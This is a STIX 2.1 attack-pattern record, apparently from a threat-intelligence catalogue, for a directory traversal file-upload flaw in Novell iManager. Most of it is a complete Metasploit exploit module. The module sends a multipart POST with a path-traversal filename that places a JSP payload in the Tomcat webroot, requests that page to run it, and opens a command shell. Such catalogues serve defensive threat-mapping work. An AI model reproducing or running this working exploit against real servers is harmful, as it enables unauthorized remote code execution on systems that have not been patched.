{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--16b7f7ae-9a0d-4ff2-9035-7486e3354883",
    "created": "2024-08-14T16:54:57.280783Z",
    "modified": "2024-08-14T16:54:57.280786Z",
    "name": "Novell iManager getMultiPartParameters Arbitrary File Upload",
    "description": " This module exploits a directory traversal vulnerability which allows remote attackers to upload and execute arbitrary code.  PortalModuleInstallManager ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/novell_imanager_upload.rb",
            "external_id": "novell_imanager_upload.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.novell.com/support/viewContent.do?externalId=7006515&sliceId=2"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell iManager getMultiPartParameters Arbitrary File Upload',\n      'Description'    => %q{\n          This module exploits a directory traversal vulnerability which\n        allows remote attackers to upload and execute arbitrary code.\n\n        PortalModuleInstallManager\n      },\n      'Author'         => [ 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => [ 'win' ],\n      'Privileged'     => true,\n      'References'     =>\n        [\n          [ 'OSVDB', '68320'],\n          [ 'ZDI', '10-190' ],\n          [ 'URL', 'http://www.novell.com/support/viewContent.do?externalId=7006515&sliceId=2' ],\n        ],\n      'Targets'        =>\n        [\n          [ 'Universal Windows Target',\n            {\n              'Arch'     => ARCH_JAVA,\n              'Payload'  =>\n                {\n                  'DisableNops' => true,\n                },\n            }\n          ],\n        ],\n      'DefaultOptions' =>\n        {\n          'SHELL' => 'cmd.exe'\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-10-01'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080)\n      ])\n  end\n\n  def exploit\n\n    page = Rex::Text.rand_text_alpha_upper(8) + \".jsp\"\n\n    fname = '../../../../../../../Progra~1/Novell/Tomcat/webapps/ROOT/'\n    fname << page\n\n    dbl = Rex::MIME::Message.new\n    dbl.add_part(payload.encoded, \"application/octet-stream\", nil, \"form-data; name=\\\"MODULE_FILE\\\"; filename=\\\"#{fname}\\\"\")\n    data = dbl.to_s\n    # For some unknown reason, the service is unhappy with an extra EOL.\n    data.strip!\n\n    print_status(\"Uploading the payload via a POST request...\")\n\n    res = send_request_cgi(\n      {\n        'uri'     => '/nps/servlet/modulemanager',\n        'version' => '1.1',\n        'method'  => 'POST',\n        'ctype'   => \"multipart/form-data; boundary=#{dbl.bound}\",\n        'data'    => data,\n      }, 5)\n\n    if ( res and res.code == 200 and res.message =~ /OK/ )\n      print_status(\"Sending our second request to '#{page}'...\")\n      data = send_request_raw({\n          'uri'     => '/' + page,\n          'method'  => 'GET',\n          'version' => '1.0',\n      }, 5)\n      handler\n    else\n      fail_with(Failure::Unknown, 'POST failed')\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-01",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}